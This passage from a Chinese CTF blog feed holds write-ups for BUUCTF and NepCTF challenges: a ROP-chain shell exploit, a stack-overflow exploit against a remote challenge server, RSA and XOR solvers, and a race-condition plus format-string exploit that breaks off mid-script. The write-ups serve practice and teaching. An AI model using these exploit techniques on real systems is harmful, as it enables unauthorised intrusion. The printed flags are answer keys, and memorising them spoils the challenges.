class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>)  <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>)  <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>)  <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>)  <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>)  <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>)  <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>)  <span class="comment"># int 0x80</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">shell = payload()</span><br><span class="line">r.sendline(shell)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2025/02/24/BUUCTF-inndy-rop-rop%E9%93%BE/3.png" alt="3"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>BUUCTF jarvisoj_tell_me_something</title>
    <url>/2025/02/13/BUUCTF-jarvisoj-tell-me-something/</url>
    <content><![CDATA[<ol>
<li><p>用IDA打开</p>
<p><img src="/2025/02/13/BUUCTF-jarvisoj-tell-me-something/1.png" alt="1"></p>
</li>
</ol>
<p>​      <img src="/2025/02/13/BUUCTF-jarvisoj-tell-me-something/2.png" alt="2"></p>
<ol start="2">
<li><p>思路基本就是利用栈溢出，执行good_game函数。</p>
</li>
<li><p>但是有一点，这个汇编可以看到没leave。可以和rip对比一下<br>本题无leave</p>
<p><img src="/2025/02/13/BUUCTF-jarvisoj-tell-me-something/3.png" alt="3"></p>
</li>
</ol>
<p>​      rip有leave<br>​       <img src="/2025/02/13/BUUCTF-jarvisoj-tell-me-something/4.png" alt="4"></p>
<p>无leave的话就不用加0x08,直接0x88就可以了</p>
<ol start="4">
<li><p>编写exp</p>
   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">29720</span>)</span><br><span class="line">getshell = <span class="number">0x400620</span></span><br><span class="line">payload_1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>) + p64(getshell)</span><br><span class="line">r.sendline(payload_1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>


</li>
<li><p>得到flag<br><img src="/2025/02/13/BUUCTF-jarvisoj-tell-me-something/5.png" alt="5"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>PWN</category>
        <category>刷题记录</category>
        <category>stack</category>
      </categories>
  </entry>
  <entry>
    <title>BUUCTF re</title>
    <url>/2025/02/12/BUUCTF-re/</url>
    <content><![CDATA[<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><ol>
<li><p>查壳发现是upx</p>
</li>
<li><p>用upx工具脱壳</p>
</li>
<li><p>进入IDA看到<br><img src="/2025/02/12/BUUCTF-re/1.png" alt="1"></p>
</li>
<li><p>这题简单a1就是flag，附上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_a1_to_string</span>():</span><br><span class="line">    <span class="comment"># 定义所有的乘数和期望结果</span></span><br><span class="line">    multipliers = [<span class="number">1629056</span>, <span class="number">6771600</span>, <span class="number">3682944</span>, <span class="number">10431000</span>, <span class="number">3977328</span>, <span class="number">5138336</span>, <span class="literal">None</span>,</span><br><span class="line">                   <span class="number">7532250</span>, <span class="number">5551632</span>, <span class="number">3409728</span>, <span class="number">13013670</span>, <span class="number">6088797</span>, <span class="number">7884663</span>, <span class="number">8944053</span>,</span><br><span class="line">                   <span class="number">5198490</span>, <span class="number">4544518</span>, <span class="number">10115280</span>, <span class="number">3645600</span>, <span class="number">9667504</span>, <span class="number">5364450</span>,</span><br><span class="line">                   <span class="number">13464540</span>, <span class="number">5488432</span>, <span class="number">14479500</span>, <span class="number">6451830</span>, <span class="number">6252576</span>, <span class="number">7763364</span>,</span><br><span class="line">                   <span class="number">7327320</span>, <span class="number">8741520</span>, <span class="number">8871876</span>, <span class="number">4086720</span>, <span class="number">9374400</span>, <span class="number">5759124</span>]</span><br><span class="line">    results = [<span class="number">166163712</span>, <span class="number">731332800</span>, <span class="number">357245568</span>, <span class="number">1074393000</span>, <span class="number">489211344</span>, <span class="number">518971936</span>,</span><br><span class="line">               <span class="literal">None</span>, <span class="number">406741500</span>, <span class="number">294236496</span>, <span class="number">177305856</span>, <span class="number">650683500</span>, <span class="number">298351053</span>,</span><br><span class="line">               <span class="number">386348487</span>, <span class="number">438258597</span>, <span class="number">249527520</span>, <span class="number">445362764</span>, <span class="number">981182160</span>, <span class="number">174988800</span>,</span><br><span class="line">               <span class="number">493042704</span>, <span class="number">257493600</span>, <span class="number">767478780</span>, <span class="number">312840624</span>, <span class="number">1404511500</span>, <span class="number">316139670</span>,</span><br><span class="line">               <span class="number">619005024</span>, <span class="number">372641472</span>, <span class="number">373693320</span>, <span class="number">498266640</span>, <span class="number">452465676</span>, <span class="number">208422720</span>,</span><br><span class="line">               <span class="number">515592000</span>, <span class="number">719890500</span>]</span><br><span class="line"></span><br><span class="line">    a1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(multipliers)):</span><br><span class="line">        <span class="keyword">if</span> multipliers[i] <span class="keyword">is</span> <span class="literal">None</span>:  <span class="comment"># 对于a1[6]，我们不知道具体的乘数，所以这里可以随意设置一个值或者保持为None</span></span><br><span class="line">            a1.append(<span class="string">&#x27;?&#x27;</span>)  <span class="comment"># 在此位置添加一个占位符</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = results[i] // multipliers[i]  <span class="comment"># 计算出正确的a1[i]值</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                char = <span class="built_in">chr</span>(value)  <span class="comment"># 将数值转换为对应的字符</span></span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                char = <span class="string">&#x27;?&#x27;</span>  <span class="comment"># 如果值不在有效的ASCII范围内，则使用&#x27;?&#x27;作为占位符</span></span><br><span class="line">            a1.append(char)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将数组转换为字符串格式</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(a1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(calculate_a1_to_string())</span><br></pre></td></tr></table></figure>

<p>由于a1[6]不知道先设成’?’，在一个个试,最后试出来是1</p>
<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;e165421110ba03099a1c039337&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>reverse</category>
        <category>刷题记录</category>
      </categories>
  </entry>
  <entry>
    <title>BUUCTF-逆向-rsa</title>
    <url>/2025/02/06/BUUCTF-%E9%80%86%E5%90%91-rsa/</url>
    <content><![CDATA[<h1 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h1><p>1.先了解rsa加密是什么<a href="https://blog.csdn.net/m0_51607907/article/details/123884953">rsa</a></p>
<p>2.打开pub_key(就是公钥)，用<a href="http://tool.chacuo.net/cryptrsakeyparse">在线网站</a>可以得到n和e</p>
<p><img src="/2025/02/06/BUUCTF-%E9%80%86%E5%90%91-rsa/1.png" alt="1"></p>
<p>3.再用<a href="http://www.factordb.com/index.php">在线网站</a>,得到p和q。</p>
<p>首先给出的n(C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD)是16进制，<a href="https://www.sojson.com/hexconvert/16to10.html">换成十进制</a>。</p>
<p><img src="/2025/02/06/BUUCTF-%E9%80%86%E5%90%91-rsa/2.png" alt="2"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import rsa</span><br><span class="line"></span><br><span class="line"># 已知的RSA参数</span><br><span class="line">e = 65537</span><br><span class="line">n = 86934482296048119190666062003494800588905656017203025617216654058378322103517</span><br><span class="line">p = 285960468890451637935629440372639283459</span><br><span class="line">q = 304008741604601924494328155975272418463</span><br><span class="line"></span><br><span class="line"># 计算φ(n)</span><br><span class="line">phi_n = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line"># 计算私钥d</span><br><span class="line">d = int(gmpy2.invert(e, phi_n))</span><br><span class="line"></span><br><span class="line"># 使用p, q, e, d生成私钥对象</span><br><span class="line">private_key = rsa.PrivateKey(n, e, d, p, q)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    # 加载密文</span><br><span class="line">    with open(&#x27;D:\\桌面\\41c4e672-98c5-43e5-adf4-49d75db307e4\\output\\flag.txt&#x27;, &quot;rb&quot;) as file:</span><br><span class="line">        ciphertext = file.read()</span><br><span class="line"></span><br><span class="line">    # 尝试解密</span><br><span class="line">    decrypted_message = rsa.decrypt(ciphertext, private_key)</span><br><span class="line">    print(&quot;解密后的消息: &quot;, decrypted_message.decode())</span><br><span class="line"></span><br><span class="line">except rsa.DecryptionError as de:</span><br><span class="line">    print(&quot;解密失败: 解密错误 - &quot;, str(de))</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(&quot;解密失败: 其他错误 - &quot;, str(e))</span><br></pre></td></tr></table></figure>

<p>解得flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;decrypt_256&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>reverse</category>
        <category>刷题记录</category>
      </categories>
  </entry>
  <entry>
    <title>[MRCTF2020]Xor(无法F5)</title>
    <url>/2025/02/20/MRCTF2020-Xor-%E6%97%A0%E6%B3%95F5/</url>
    <content><![CDATA[<h3 id="无法F5的题目"><a href="#无法F5的题目" class="headerlink" title="无法F5的题目"></a>无法F5的题目</h3><ol>
<li><p>只能先用IDA打开，看汇编<br><img src="/2025/02/20/MRCTF2020-Xor-%E6%97%A0%E6%B3%95F5/1.png" alt="1"></p>
</li>
<li><p>分析一下</p>
<p><img src="/2025/02/20/MRCTF2020-Xor-%E6%97%A0%E6%B3%95F5/2.png" alt="2"></p>
</li>
</ol>
<p>​       <img src="/2025/02/20/MRCTF2020-Xor-%E6%97%A0%E6%B3%95F5/3.png" alt="3"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_41EA08[] = &#123; <span class="comment">/* ... 需要填充实际值 ... */</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span> &#123;</span><br><span class="line">    <span class="type">char</span> inputBuffer[<span class="number">100</span>]; <span class="comment">// 0x64 (100 in decimal)</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Give Me Your Flag String:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, inputBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> length = <span class="built_in">strlen</span>(inputBuffer);</span><br><span class="line">    <span class="keyword">if</span>(length != <span class="number">0x27</span> <span class="comment">/* 39 in decimal */</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">// 或者其它错误处理</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>((inputBuffer[i] ^ i) != byte_41EA08[i]) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Right!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 大概就是上面编码的意思</p>
<ol start="3">
<li><p>编写脚本解题<br>找到byte_41EA08<br><img src="/2025/02/20/MRCTF2020-Xor-%E6%97%A0%E6%B3%95F5/4.png" alt="4"></p>
   <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> ida_chars[] =</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="number">0x4D</span>, <span class="number">0x53</span>, <span class="number">0x41</span>, <span class="number">0x57</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, <span class="number">0x46</span>, <span class="number">0x58</span>, <span class="number">0x5A</span>, <span class="number">0x3A</span>, </span><br><span class="line">  <span class="number">0x4A</span>, <span class="number">0x3A</span>, <span class="number">0x60</span>, <span class="number">0x74</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x22</span>, <span class="number">0x4E</span>, <span class="number">0x40</span>, <span class="number">0x20</span>, </span><br><span class="line">  <span class="number">0x62</span>, <span class="number">0x70</span>, <span class="number">0x64</span>, <span class="number">0x64</span>, <span class="number">0x7D</span>, <span class="number">0x38</span>, <span class="number">0x67</span>, <span class="number">0x00</span></span><br><span class="line"> &#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="built_in">strlen</span>(ida_chars)];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(ida_chars);i++)&#123;</span><br><span class="line">    	flag[i] = ida_chars[i] ^ i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;flag:%s&quot;</span>,flag);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MRCTF&#123;@_R3@1ly_E2_R3verse!&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>reverse</category>
        <category>刷题记录</category>
      </categories>
  </entry>
  <entry>
    <title>NepCTF2025-部分pwn的wp(复现)</title>
    <url>/2025/08/01/NepCTF2025-%E9%83%A8%E5%88%86pwn%E7%9A%84wp-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>参考blog(<a href="https://bbs.kanxue.com/thread-287806.htm#msg_header_h3_0">https://bbs.kanxue.com/thread-287806.htm#msg_header_h3_0</a>)</p>
<h2 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h2><p>mian</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pthread_t</span> newthread[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  newthread[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_2A31();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_2B0F() )</span><br><span class="line">      ;</span><br><span class="line">    pthread_create(newthread, <span class="number">0LL</span>, start_routine, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_2A31()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_2A31</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">5</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%100s&quot;</span>, byte_50A0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will tell you all file names in the current directory!&quot;</span>);</span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/bin/ls&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = <span class="string">&quot;/&quot;</span>;</span><br><span class="line">  argv[<span class="number">2</span>] = <span class="string">&quot;-al&quot;</span>;</span><br><span class="line">  argv[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !fork() )</span><br><span class="line">    execve(<span class="string">&quot;/bin/ls&quot;</span>, argv, <span class="number">0LL</span>);</span><br><span class="line">  wait(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good luck :-)&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_2B0F</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_2B0F</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input file name you want to read:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, file);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(file, <span class="string">&quot;flag&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;flag is not allowed!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>start_routine</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">start_routine</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-46Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-468h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-464h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">96</span>]; <span class="comment">// [rsp+10h] [rbp-460h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">16</span>]; <span class="comment">// [rsp+70h] [rbp-400h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1000</span>]; <span class="comment">// [rsp+80h] [rbp-3F0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+468h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  sub_1329(v6);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(file);</span><br><span class="line">  sub_1379(v6, file, v1);</span><br><span class="line">  sub_14CB(v6, v7);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will tell you last file name content in md5:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, (<span class="type">unsigned</span> __int8)v7[i]);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">999</span>; ++j )</span><br><span class="line">    buf[j] = <span class="number">0</span>;</span><br><span class="line">  fd = open(file, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(fd, buf, <span class="number">0x3E8u</span>LL);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(byte_50A0);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot; ,your file read done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;file not found!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里在start_routine的printf(byte_50A0);有格式化字符串漏洞很明显我们要把读入的flag通过的格式化字符串泄露出来。</p>
<p>可是在sub_2B0F读入的文件名对flag进行了过滤。这里就要了解一下进程和线程的关系了。</p>
<p><strong>线程与进程的基本关系（复习）</strong></p>
<ul>
<li><strong>进程（Process）</strong>：操作系统资源分配的基本单位。每个进程拥有独立的内存空间、文件描述符、环境变量等。进程之间相互隔离，通信需要通过 IPC（如管道、消息队列）。</li>
<li><strong>线程（Thread）</strong>：进程内的执行单元（轻量级进程）。多个线程共享同一进程的资源（如内存、文件描述符），但每个线程有自己的栈、寄存器和程序计数器。线程切换开销小，适合并发任务。</li>
</ul>
<p><strong>线程竞争（Race Condition）的定义和原因</strong></p>
<ul>
<li><strong>定义</strong>：当多个线程同时读写共享资源（如 <code>filename</code>），且没有同步机制（如锁）时，程序的执行结果依赖于线程调度的时序，导致不一致或错误。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">时间   事件</span><br><span class="line">----  ----</span><br><span class="line">t0    用户输入 &quot;temp.txt&quot; → main 线程设置 filename = &quot;temp.txt&quot;</span><br><span class="line">t1    main 启动 work 线程</span><br><span class="line">t2    work 线程开始 MD5 计算（耗时操作，持续到 t2+100ms）</span><br><span class="line">      ↳ 在此期间，main 线程被挂起（open 延迟）</span><br><span class="line">t2+50ms 用户输入 &quot;flag&quot; → main 线程设置 filename = &quot;flag&quot;（覆盖）</span><br><span class="line">t2+100ms work 线程完成 MD5 计算</span><br><span class="line">t2+101ms main 线程恢复，执行 open(filename) → 打开 &quot;flag&quot; 文件</span><br></pre></td></tr></table></figure>

<p>再用格式化字符串泄露flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello aaaa0x71a74c1fe8a0(nil)(nil)0x6(nil)0x10000000000x3000003e80x2000x36c63f9b4b69cc070x2bc422698ba00f710x80656d6974(nil)(nil)(nil)(nil)(nil)(nil)0x20(nil)0x36c63f9b4b69cc070x2bc422698ba00f710x10102464c457f(nil)0x1003e00030x12400x400x41980x380040000000000x1c001d0040000d0x4000000060x400x400x400x2d80x2d80x80x4000000030x318 ,your file read done!</span><br></pre></td></tr></table></figure>

<p>把16进制</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0x80656d6974</span> ---&gt; time</span><br></pre></td></tr></table></figure>

<p>来算一下它在那个位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello aaaa</span><br><span class="line">0x71a74c1fe8a0 (nil (nil) 0x6 (nil) 0x1000000000 0x3000003e8 0x200 0x36c63f9b4b69cc07 0x2bc422698ba00f71 0x80656d6974 (nil) (nil) (nil) (nil) (nil) (nil) 0x20 (nil) 0x36c63f9b4b69cc07 0x2bc422698ba00f71 0x10102464c457f (nil) 0x1003e0003 0x1240 0x40 0x4198 0x38004000000000 0x1c001d0040000d 0x400000006 0x40 0x40 0x40 0x2d8 0x2d8 0x8 0x400000003 0x318 ,your file read done!  </span><br></pre></td></tr></table></figure>

<p>文件在12的位置，但是我们不知道内容在什么位置，我在本地创建一个fake:aaaa来算一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello aaaa</span><br><span class="line">0x7264a8ffe8a0 (nil) (nil) 0x6 (nil) 0x1000000000 0x3000003e8 0x200 0x9c9604acef9d4c14 0x94a18eaaefd8fa7b 0x80656b6166 (nil) (nil) (nil) (nil) (nil) (nil) 0x20 (nil) 0x9c9604acef9d4c14 0x94a18eaaefd8fa7b 0xa61616161  (nil) (nil) (nil) (nil) (nil) (nil)</span><br><span class="line">(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil) ,your file read done!</span><br></pre></td></tr></table></figure>

<p>在22的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置远程连接参数</span></span><br><span class="line">HOST = <span class="string">&quot;nepctf32-1ris-vabv-sri2-p9kvlhq2i224.nepctf.com&quot;</span></span><br><span class="line">PORT = <span class="number">443</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化连接</span></span><br><span class="line">io = remote(HOST, PORT, ssl=<span class="literal">True</span>, sni=HOST)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造格式字符串漏洞利用负载</span></span><br><span class="line">leak_payload = <span class="string">f&quot;%<span class="subst">&#123;<span class="number">12</span>+<span class="number">9</span>&#125;</span>$p&quot;</span>  <span class="comment"># 起始地址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    leak_payload += <span class="string">f&quot;-%<span class="subst">&#123;<span class="number">13</span>+<span class="number">9</span>+i&#125;</span>$p&quot;</span>  <span class="comment"># 连续泄露后续16个地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送名称触发漏洞</span></span><br><span 